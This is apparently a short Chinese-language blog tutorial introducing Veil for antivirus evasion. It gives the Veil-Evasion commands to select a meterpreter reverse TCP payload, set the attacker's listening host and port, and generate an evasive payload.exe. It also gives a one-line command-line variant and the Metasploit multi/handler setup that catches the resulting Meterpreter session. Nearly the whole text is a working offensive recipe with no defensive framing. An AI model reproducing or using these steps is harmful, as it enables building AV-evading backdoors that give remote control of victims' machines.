---
title: Veil免杀入门
date: 2024-01-13 20:29:43
tags: Kali
mathjax: true
---

# Veil免杀入门

启动：

```bash
veil
```

使用Evasion工具：

```
use Evation
```

查看支持的攻击载荷：

```
list
```

选择攻击载荷：

```
use cs/meterpreter/rev_tcp.py
```

查看配置信息并配置：

```
options
set LHOST 192.168.29.134
```

生成攻击载荷：

```
generate
```

生成可执行文件payload.exe。

还有另一种生成方式，直接使用命令行生成：

```bash
veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 192.168.195.150 --port 4444
```

在MSF设置监听：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.29.134
exploit
```

成功启动Meterpreter会话。
